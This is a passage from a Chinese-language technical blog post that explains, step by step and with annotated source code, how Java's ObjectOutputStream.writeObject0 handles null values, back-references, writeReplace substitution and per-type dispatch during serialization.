class="line">            <span class="comment">// 情况 A：null 直接写 TC_NULL（0x70），无需进入后续逻辑</span></span><br><span class="line">            writeNull();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 情况 B：允许共享，且该对象已写过（在句柄表中有条目）</span></span><br><span class="line">            <span class="comment">//         → 写 TC_REFERENCE（0x71） + 4 字节句柄 ID，避免重复写整对象</span></span><br><span class="line">            writeHandle(h);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="comment">// 情况 C：是“类对象”（java.lang.Class）</span></span><br><span class="line">            <span class="comment">//         → 写 TC_CLASS（0x76）并跟随该类的描述引用或描述体</span></span><br><span class="line">            writeClass((Class) obj, unshared);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">            <span class="comment">// 情况 D：是“类描述符”（ObjectStreamClass，包含 SUID、字段签名等）</span></span><br><span class="line">            <span class="comment">//         → 写 TC_CLASSDESC（0x72）或代理描述 TC_PROXYCLASSDESC（0x7D）</span></span><br><span class="line">            writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =====================  第二段：对象替换链（writeReplace / replaceObject） =====================</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;            <span class="comment">// 保留“最初对象”，用于判断是否发生替换</span></span><br><span class="line">        Class&lt;?&gt; cl = obj.getClass(); <span class="comment">// 当前待写对象的运行时类型</span></span><br><span class="line">        ObjectStreamClass desc;       <span class="comment">// 该类型对应的序列化描述符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">// 查/建该类的 ObjectStreamClass 描述符（会解析序列化相关元信息）</span></span><br><span class="line">            <span class="comment">// 第二个参数 true 表示：如无缓存需构建（不同 JDK 具体语义略有差别，但可理解为“强制查找/建”）</span></span><br><span class="line">            desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若该类声明了私有的 writeReplace()：</span></span><br><span class="line">            <span class="comment">//   - 调用后可能返回：</span></span><br><span class="line">            <span class="comment">//       * null：表示最终替换为 null（将写 TC_NULL）</span></span><br><span class="line">            <span class="comment">//       * 同类对象（cl 不变）：替换链到此收敛，跳出循环</span></span><br><span class="line">            <span class="comment">//       * 不同类对象（cl 变化）：继续对新对象的新类进行 writeReplace 检查（多级替换）</span></span><br><span class="line">            <span class="keyword">if</span> (!desc.hasWriteReplaceMethod()) &#123;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 无 writeReplace，跳出替换链</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> desc.invokeWriteReplace(obj); <span class="comment">// 反射调用私有 writeReplace()</span></span><br><span class="line">            <span class="keyword">if</span> (rep == <span class="literal">null</span>) &#123;</span><br><span class="line">                obj = <span class="literal">null</span>;           <span class="comment">// 标记为最终写 null</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Class&lt;?&gt; repCl = rep.getClass();</span><br><span class="line">            obj = rep;                <span class="comment">// 使用替换后的对象继续下一轮</span></span><br><span class="line">            <span class="keyword">if</span> (repCl == cl) &#123;</span><br><span class="line">                <span class="comment">// 替换后类型未变，视为收敛</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cl = repCl;               <span class="comment">// 类型改变 → 继续循环，对新类型做同样检查</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若启用了“全局替换钩子”（仅当自定义子类通过 enableReplaceObject(true) 开启）：</span></span><br><span class="line">        <span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">            <span class="comment">// replaceObject 可被子类重写，用于统一的替换策略（如过滤、包装等）</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> replaceObject(obj);</span><br><span class="line">            <span class="comment">// 注意：允许返回 null（表示写 null）</span></span><br><span class="line">            <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 类型改变时，需要更新类与描述符，以便后续正确分派</span></span><br><span class="line">                cl = rep.getClass();</span><br><span class="line">                desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            obj = rep;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =====================  第三段：若发生替换，登记并重走快速判定 =====================</span></span><br><span class="line">        <span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">            <span class="comment">// 3.1 登记 orig -&gt; obj 的替换映射：</span></span><br><span class="line">            <span class="comment">//     这样后续再次遇到 orig 时，subs.lookup(orig) 会稳定地返回相同的替代对象 obj。</span></span><br><span class="line">            subs.assign(orig, obj);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.2 替换后需要再做一次“快速路径”检查（null / 已写出 / Class / ObjectStreamClass）</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">                writeNull();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                writeHandle(h);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                writeClass((Class) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 注意：此处未直接把 obj 记入句柄表；真正登记通常发生在后续具体写出函数</span></span><br><span class="line">            <span class="comment">// （如 writeString / writeArray / writeOrdinaryObject 中的 handles.assign(...)）</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =====================  第四段：类型分派（进入实际的编码/写出逻辑） =====================</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="comment">// 字符串：</span></span><br><span class="line">            <span class="comment">// - 根据 MUTF-8 字节长度选择 TC_STRING(&lt;=0xFFFF) 或 TC_LONGSTRING(&gt;0xFFFF)</span></span><br><span class="line">            <span class="comment">// - 内部会按 unshared 语义决定是否登记句柄</span></span><br><span class="line">            writeString((String) obj, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">            <span class="comment">// 数组：</span></span><br><span class="line">            <span class="comment">// - 原始类型数组与对象数组的编码不同</span></span><br><span class="line">            <span class="comment">// - 会写 TC_ARRAY + 类描述（或引用）+ 长度 + 元素数据</span></span><br><span class="line">            writeArray(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">            <span class="comment">// 枚举：</span></span><br><span class="line">            <span class="comment">// - 写 TC_ENUM + 枚举类型描述（或引用）+ 枚举常量名（String）</span></span><br><span class="line">            writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">            <span class="comment">// 可序列化的常规对象：</span></span><br><span class="line">            <span class="comment">// - 写 TC_OBJECT + 类描述（或引用）</span></span><br><span class="line">            <span class="comment">// - 按声明的字段（非 transient/非 static）自顶向下写父类链上的实例数据</span></span><br><span class="line">            <span class="comment">// - 若类实现 Externalizable 或声明自定义 writeObject/readObject 也会在这里处理</span></span><br><span class="line">            writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 不能序列化：抛出 NotSerializableException，必要时附带调试路径栈信息</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">                    cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// ⑤ 恢复调用前的环境，确保流状态一致</span></span><br><span class="line">        depth--;                        <span class="comment">// 恢复嵌套深度</span></span><br><span class="line">        bout.setBlockDataMode(oldMode); <span class="comment">// 恢复原先的块模式（保证输入端按相同模式读取）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>writeObject0()</code> 方法最开始的地方，首先代码先关闭输出流的<code>Data Block</code>模式，并且将<strong>原始模式</strong>赋值给变量 <code>oldMode</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进入结构化写入：先关掉块数据模式（非块模式用于写 TC_OBJECT / 类描述 等结构标记）</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bout.setBlockDataMode(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>接下来会处理<strong>已经处理过的</strong>和<strong>不可替换的</strong>对象，这些都是不能够序列化的，其实在大多数情况下，我们的代码都不会进入这个代码块。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 1) 处理已知替换与“null”直写，以及已写出对象的句柄复用</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="type">int</span> h;</span><br><span class="line"><span class="comment">// 通过替换表做一次“规范化”查找：</span></span><br><span class="line"><span class="comment">//  - 对 null 会返回 null；</span></span><br><span class="line"><span class="comment">//  - 对已登记的被替换对象，返回其替换后的对象（保持替换稳定）。</span></span><br><span class="line"><span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.a 对象为 null → 写 TC_NULL</span></span><br><span class="line">    writeNull();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.b 允许共享，且对象此前已写出过 → 写引用 TC_REFERENCE + 句柄ID</span></span><br><span class="line">    writeHandle(h);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">    <span class="comment">// 1.c 直接写类对象（TC_CLASS + 类描述或引用）</span></span><br><span class="line">    writeClass((Class) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">    <span class="comment">// 1.d 写类描述符（包含 SUID、字段签名等）</span></span><br><span class="line">    writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>具体来看，代码首先会进入 <code>subs.lookup(obj)</code> 进行判断。该方法会查找并返回给定对象的替换。如果找不到替换，则返回查找对象本身。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查找并返回给定对象的“替代对象”（replacement）。</span></span><br><span class="line"><span class="comment"> * 若未找到对应的替代对象，则返回传入的原对象本身。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - htab：对象 → 槽位索引 的哈希表，lookup(obj) 找不到时返回负数。</span></span><br><span class="line"><span class="comment"> * - reps：与 htab 的索引一一对应的替代对象数组；reps[i] 是索引 i 的替代对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  待查询是否有替代对象的原对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>     若已登记替代对象则返回该替代对象，否则返回原对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Object <span class="title function_">lookup</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="comment">// 在哈希表中查询 obj 对应的槽位索引；未命中会得到负数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> htab.lookup(obj);</span><br><span class="line">    <span class="comment">// 命中：返回 reps[index]；未命中：直接返回原对象 obj</span></span><br><span class="line">    <span class="keyword">return</span> (index &gt;= <span class="number">0</span>) ? reps[index] : obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，这个方法实际上就是处理以前写入的对象和不可替换的对象。更直白点的意思，这段代码实际上做的是一个检测功能，如果检测到当前传入对象在“替换哈希表(<code>ReplaceTable</code>)”中无法找到，那么就调用 <code>writeNull</code> 方法。</p>
<p>接着继续判断当前写入方式是不是“<code>unshared</code>”方式，然后可以看到紧跟着的就是 <code> handles.lookup(obj)</code>：</p>
<p>该 <code>lookup</code> 方法会查找并返回与给定对象关联的 <code>handler</code>，如果没有找到映射，则返回 -1，直白的意思就是说判断是否在“引用哈希表(<code>HandleTable</code>)”中找到该引用，如果有，那么调用 <code>writeHandle</code> 方法并且返回；如果没找到，那么返回 -1，需要进一步序列化处理。</p>
<p>之后判断当前传入对象是不是特殊类型的 <code>Class</code> 和 <code>ObjectStreamClass</code>，如果是，则调用 <code>writeClass</code> 或 <code>writeClassDesc</code> 方法并且返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">    <span class="comment">// 1.c 直接写类对象（TC_CLASS + 类描述或引用）</span></span><br><span class="line">    writeClass((Class) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">    <span class="comment">// 1.d 写类描述符（包含 SUID、字段签名等）</span></span><br><span class="line">    writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当以上条件都不满足的时候(不进入if)，开始检查是否开启了替换对象。但实际上 <code>enableReplace</code> 的值通常为 <code>false</code>，因此我们并不会进入这一代码段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 2) writeReplace 链 + 全局替换钩子 replaceObject</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;            <span class="comment">// 记录原始对象，用于检测是否发生替换</span></span><br><span class="line">Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">ObjectStreamClass desc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// REMIND: skip this check for strings/arrays?</span></span><br><span class="line">    <span class="comment">// 译：是否需要对字符串/数组跳过 writeReplace 检查（保留上游注释）</span></span><br><span class="line">    Class&lt;?&gt; repCl;</span><br><span class="line">    <span class="comment">// 查找/构建该类的序列化描述符（若类可序列化，将解析其 writeReplace 等）</span></span><br><span class="line">    desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 若类定义了私有的 writeReplace()，则调用它；当返回的替代对象</span></span><br><span class="line">    <span class="comment">//   - 为 null：直接结束（后面会写 null）</span></span><br><span class="line">    <span class="comment">//   - 与原类相同：链收敛，结束</span></span><br><span class="line">    <span class="comment">//   - 与原类不同：继续对“新对象的新类”循环检测（多级替换）</span></span><br><span class="line">    <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">        (obj = desc.invokeWriteReplace(obj)) == <span class="literal">null</span> ||</span><br><span class="line">        (repCl = obj.getClass()) == cl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cl = repCl;  <span class="comment">// 继续沿替换后的类型进行检查</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若开启了全局替换（通过 enableReplaceObject(true)），则应用 replaceObject 钩子</span></span><br><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> replaceObject(obj);</span><br><span class="line">    <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="literal">null</span>) &#123;</span><br><span class="line">        cl = rep.getClass();</span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    obj = rep;  <span class="comment">// 允许将对象替换为 null（表示最终写 null）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果对象被替换，这里会对原始对象进行二次检查，和最开始的那段代码很像，这里先将替换对象插入到 <code>subs</code>(替换哈希表)中，然后进行类似的判断。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 3) 如果发生了“对象替换”，需要：</span></span><br><span class="line"><span class="comment">//    - 在替换表登记 orig -&gt; obj；</span></span><br><span class="line"><span class="comment">//    - 再次执行第 1 步的快速判定（null / 句柄复用 / Class / ObjectStreamClass）</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">    <span class="comment">// 登记替换映射：保证后续再次遇到 orig 时稳定替换为同一个 obj</span></span><br><span class="line">    subs.assign(orig, obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(h);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        writeClass((Class) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">        writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以上执行都完成过后，会处理剩余对象类型：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 4) 常见类型分派：字符串 / 数组 / 枚举 / 常规可序列化对象</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    <span class="comment">// 写字符串：根据长度选择 TC_STRING 或 TC_LONGSTRING</span></span><br><span class="line">    writeString((String) obj, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">    <span class="comment">// 写数组：原始类型数组与对象数组编码不同</span></span><br><span class="line">    writeArray(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">    <span class="comment">// 写枚举：写所属枚举类型描述符 + 常量名</span></span><br><span class="line">    writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">    <span class="comment">// 常规对象：写类描述符、实例数据（含父类链上非 transient 非 static 字段）</span></span><br><span class="line">    <span class="comment">// 内部会处理 Externalizable / writeObject 自定义等分支</span></span><br><span class="line">    writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 不可序列化：抛出 NSEE；若启用扩展调试信息，附带“写入路径栈”</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">            cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>如果传入对象为 <code>String</code> 类型，那么调用 <code>writeString</code> 方法将数据写入字节流；</p>
</li>
<li><p>如果传入对象为 <code>Array</code> 类型，那么调用 <code>writeArray</code> 方法将数据写入字节流；</p>
</li>
<li><p>如果传入对象为 <code>Enum</code> 类型，调用 <code>writeEnum</code> 方法将数据写入字节流；</p>
</li>
<li><p>如果传入对象实现了 <code>Serializable</code> 接口，调用 <code>writeOrdinaryObject</code> 方法将数据写入字节流；</p>
</li>
</ul>
<p>以上条件都不满足时则抛出 <code>NotSerializableException</code> 异常信息；</p>
<p>对于 <code>writeString</code>、<code>writeArray</code>、<code>writeEnum</code> 的方法我们就不详谈了，只以 <code>writeString</code> 为例简单讲下。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将给定字符串写入到序列化流；根据字符串按“修改版 UTF-8（MUTF-8）”编码后的字节长度，</span></span><br><span class="line"><span class="comment"> * 在两种格式之间二选一：</span></span><br><span class="line"><span class="comment"> * - 标准字符串：TC_STRING + 2 字节长度（&lt;= 0xFFFF）+ UTF 字节</span></span><br><span class="line"><span class="comment"> * - 长字符串：  TC_LONGSTRING + 8 字节长度（&gt; 0xFFFF）+ UTF 字节</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 这里的“UTF”是 Java 序列化/ DataOutput 使用的 **修改版 UTF-8（MUTF-8）**，其长度不是字符数，</span></span><br><span class="line"><span class="comment"> *   而是编码后的字节数（例如 U+0000 会编码为 0xC0 0x80）。</span></span><br><span class="line"><span class="comment"> * - `unshared == true` 时，该对象按“非共享（unshared）”语义写出：不会被放入句柄查表用于后续 TC_REFERENCE 回引；</span></span><br><span class="line"><span class="comment"> *   但仍会消耗一个句柄位以维持对象图的一致性。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeString</span><span class="params">(String str, <span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 为即将写出的对象“分配一个句柄编号”。当 unshared 为 true 时，传入 null，</span></span><br><span class="line">    <span class="comment">// 表示不把这个对象登记进句柄查找表（后续不能通过 TC_REFERENCE 